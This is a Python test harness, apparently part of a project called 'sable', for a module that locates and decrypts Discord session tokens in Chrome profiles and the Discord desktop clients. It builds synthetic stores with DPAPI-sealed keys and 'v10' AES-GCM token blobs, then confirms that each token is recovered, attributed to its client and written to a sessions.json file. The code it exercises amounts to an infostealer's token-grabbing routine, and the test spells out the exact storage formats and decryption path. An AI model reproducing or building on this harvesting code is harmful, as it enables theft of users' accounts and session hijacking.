"""Session tokens: browser store and Discord desktop store, real DPAPI, real AES-GCM.

Synthetic trees only. The key is invented, sealed with the machine's own DPAPI so the
unwrap path is the real one, and every artifact lives in a temp directory.
"""

from __future__ import annotations

import base64
import ctypes
import json
import os
import sys
import tempfile
from ctypes import wintypes
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

os.environ.setdefault("PYTHONIOENCODING", "utf-8")

from Crypto.Cipher import AES  # noqa: E402

from agent.sources import sessions  # noqa: E402
from agent.sources.browsers import Root  # noqa: E402


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

crypt32.CryptProtectData.argtypes = [
    ctypes.POINTER(DATA_BLOB),
    wintypes.LPCWSTR,
    ctypes.POINTER(DATA_BLOB),
    ctypes.c_void_p,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.POINTER(DATA_BLOB),
]
crypt32.CryptProtectData.restype = wintypes.BOOL
kernel32.LocalFree.argtypes = [ctypes.c_void_p]
kernel32.LocalFree.restype = ctypes.c_void_p


def protect(data: bytes) -> bytes:
    buffer = ctypes.create_string_buffer(data, len(data))
    blob_in = DATA_BLOB(len(data), ctypes.cast(buffer, ctypes.POINTER(ctypes.c_char)))
    blob_out = DATA_BLOB()
    ok = crypt32.CryptProtectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    )
    if not ok:
        raise OSError(ctypes.get_last_error())
    try:
        return ctypes.string_at(blob_out.pbData, blob_out.cbData)
    finally:
        kernel32.LocalFree(blob_out.pbData)


NONCE = bytes(range(12))


def seal(plain: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_GCM, nonce=NONCE)
    ciphertext, tag = cipher.encrypt_and_digest(plain)
    return b"v10" + NONCE + ciphertext + tag


def write_state(directory: Path, key: bytes) -> None:
    document = {
        "os_crypt": {"encrypted_key": base64.b64encode(b"DPAPI" + protect(key)).decode()}
    }
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "Local State").write_text(json.dumps(document), encoding="utf-8")


def write_leveldb(directory: Path, body: bytes) -> None:
    leveldb = directory / "Local Storage" / "leveldb"
    leveldb.mkdir(parents=True, exist_ok=True)
    (leveldb / "000003.log").write_bytes(body)


results: list[tuple[str, bool, str]] = []


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, detail))


def main() -> int:
    browser_key = bytes(range(32))
    desktop_key = bytes(reversed(range(32)))

    with tempfile.TemporaryDirectory(prefix="sable-sessions-") as scratch:
        work = Path(scratch)

        # --- a browser profile, the way Chrome lays it out
        user_data = work / "browsers" / "User Data"
        profile = user_data / "Default"
        write_state(user_data, browser_key)
        write_leveldb(
            profile,
            b"\x00\x01record"
            + b"dQw4w9WgXcQ:"
            + base64.b64encode(seal(b"browser-token-AAA", browser_key))
            + b"\x02junk",
        )

        # --- the desktop client, same layout, its own key
        app = work / "roaming" / "discord"
        write_state(app, desktop_key)
        write_leveldb(
            app,
            b"\x00\x01record"
            + b"dQw4w9WgXcQ:"
            + base64.b64encode(seal(b"desktop-token-BBB", desktop_key))
            + b"\x02junk",
        )

        # --- a store with a plain, unsealed token
        plain_app = work / "roaming" / "discordcanary"
        write_leveldb(
            plain_app,
            b"\x00\x01record" + b"mfa." + b"A" * 84 + b"\x02junk",
        )

        os.environ["APPDATA"] = str(work / "roaming")
        os.environ["LOCALAPPDATA"] = str(work / "local")

        sessions.chromium_roots = lambda: [Root("chrome", user_data, False)]
        sessions.profile_dirs = lambda path: [path / "Default"]
        sessions._DESKTOP = (
            ("discord", "APPDATA", "discord"),
            ("discord", "APPDATA", "Discord"),
            ("discord_canary", "APPDATA", "discordcanary"),
            ("discord_absent", "APPDATA", "not-installed"),
        )
        sessions._MAX_VALIDATIONS = 0
        sessions._VALIDATION_CACHE.clear()

        targets = list(sessions._targets())
        labels = [item[0] for item in targets]

        check("finds the browser store", "chrome" in labels, str(labels))

        # Both spellings of the Discord directory resolve to one folder on Windows, so
        # the second sighting must be dropped rather than scanned twice.
        check(
            "one store per Discord directory however it is spelled",
            labels.count("discord") == 1,
            str(labels),
        )
        check("finds the desktop store", "discord" in labels, str(labels))
        check("finds the canary store", "discord_canary" in labels, str(labels))
        check(
            "an absent client is not yielded",
            "discord_absent" not in labels,
            str(labels),
        )

        out = work / "out"
        written = sessions.run(out, None)
        document = json.loads((out / "sessions.json").read_text(encoding="utf-8"))
        by_token = {entry["token"]: entry for entry in document}

        check("returns a count", written == 3, str(written))
        check("browser token decrypts", "browser-token-AAA" in by_token, str(sorted(by_token)))
        check("desktop token decrypts", "desktop-token-BBB" in by_token, str(sorted(by_token)))
        check(
            "the desktop key is the desktop one, not the browser one",
            by_token.get("desktop-token-BBB", {}).get("profile") == "discord",
            str(by_token.get("desktop-token-BBB", {})),
        )
        check(
            "an unsealed token is kept as it is",
            any(token.startswith("mfa.") for token in by_token),
            str(sorted(by_token)),
        )
        check(
            "the store records which client it came from",
            by_token.get("browser-token-AAA", {}).get("browser") == "chrome",
            str(by_token.get("browser-token-AAA", {})),
        )

        # The record separator ends the match: a base64 body must not swallow the next
        # record, which is the bug the source repository shipped.
        check(
            "the body stops at the record separator",
            all("\x02" not in token for token in by_token),
            "",
        )

        # No store at all means no file and no crash.
        empty = work / "empty"
        empty.mkdir()
        sessions.chromium_roots = lambda: [Root("chrome", empty / "User Data", False)]
        sessions._DESKTOP = ()
        check("no store writes nothing", sessions.run(work / "none", None) == 0)
        check("no store writes no file", not (work / "none" / "sessions.json").exists())

    failed = [item for item in results if not item[1]]
    for label, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main())
